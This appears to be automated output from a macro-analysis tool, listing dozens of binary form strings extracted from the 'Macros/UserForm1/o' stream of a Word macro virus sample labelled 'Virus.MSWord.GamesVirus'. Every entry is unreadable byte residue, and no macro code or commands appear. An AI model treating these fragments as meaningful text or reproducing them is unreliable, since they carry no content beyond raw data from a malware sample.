-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) \ciG909JQKZY9JQKZQ?9QAJY$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1a.1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1aF10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!aFs�Ek�Ns�<caF10���Ns�=k�P��<ciMkqNs�<ca3Zq!JiFs�j��I��r��i��H��X��X��P��i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8"Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!JY<cq)JaEkq)JY1JQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BY:Ra0BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ag{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A9J�)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A%)q9Jq(BaLc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!QAJQ%)a%)Y-)i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 79I$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
618.188BI8BYAJQAJa$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1i-)Y%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i%)a%)i%)i%)a$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a%)i$!a?��SZa$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5) F10W98PBAaJAaJAcZQYJAHBA?98y��=)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)YFs�W{�<cqj��>1(i��DcaY��Ns�Eki3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ3Zi3Zi2RqNs�a��P��X��O{�P��W{�X��i��i��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
18 Ba'9QNs�Dcq;ZyDcq)JY)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 1JY)JY)JY&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I:R�;Zq/9�<c�(Bi0B�0Bq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I<c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q?90
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a79Y?90
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BQ5)(79I7988BAAJIAJQBRY-)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0,!0NsaG90>1(HB0YJIPB8aJIg98N10O90=)(-) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8]k�5)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Lcq5)0Dcq	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y`��P��<cqVs�5)(r��)JaP��Ns�)Ja;ZaDci3Zi2RYNs�G{�a��G{�j��O{�Fs�X��X��a��X��r��W{�2Ri<ci3ZiDcq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9ILca;ZY1JI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0(BY)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 &1I&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8^s�(Bi9J�0BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y:Ry'9Y&1y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1i.1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q610
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a8Ba-) %) BRY,! %) ,!0=)(O98W98O90PB8YJAO90HB8g98N10F10,! ,! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5)(%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a.1i>1(%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0`BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y.1i%)Y%)a"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!(E)(61(V18V10`BAbRI

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 aJIYJAXB8aJI`BA`B8XBAF10V10N105)(5)(-) O{�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BYMky*Ra*RaEkqO{�W{�Q��G{�a��W{�O{�`��X��a��X��j��W{�)JaDcy2Ri(BY)JQ:RY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9I)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8Vs�1JqUk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A/9Q)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q%)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q61(h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i%)i9Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! BRY5) @BQ%)08BIg{yAJQ61a,!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i%)a%)a&1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! %) 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)(-)(5)(5)(=)(>10g98PB8QJI?90O98YJ8N1(cZQZRIXB8cZQ_98F10=)0N10F105)(5) ,!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4!04!0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1a%)a.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!YO{�`��Fs�X��DcaNsyNs�X�����Ns�*Ra)JiMki<c�P��j��Q��<c�@��W{�H��W{�i��X��X��{��r��3ZiDca
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY'9Q'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1aVs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q&1i)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a8Bi798
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BQ>1(.1a79I8BIJRaAJa79QG90.1a%)a$!A

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,! -) 5)(F1061(F10%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)8V10F105)(61(>10$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)iG90%)i%)i%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a>1(%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
61(?90
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)YW{�X��{��O{�i��P��Y��4c�a��O{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
183Zq;ZYMkya��i��a��@��Fs�Fs�Fs�{��O{�P��X��O{�P��2Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!(.18

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A'9i/9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ICZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0%)I

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
88Bi&1i'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q-)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i&1i%)a79a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PB8N10YJAaJIaJAkZYPB8XB8o98PBAF10N185)(61(5)0F10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a%)a.1i&1i%)a&1i%)a-)a%)i%)a%)a%)i-)a%)i.1a%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)YNs�W{�a��O{�O{�{��Q��G{�Y��Eky Ba(BQ5k�;ZaX��j��a��{��P��Fs�Ns�i��X��a��X��Q��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A(BQ1Ja1Ja(BY'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a'9A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I79Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q&1Q*Ri%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i%)i%)a61a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1(.1AW909JQ8BY/9Q8Bi&1i%)aG90%)a%)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
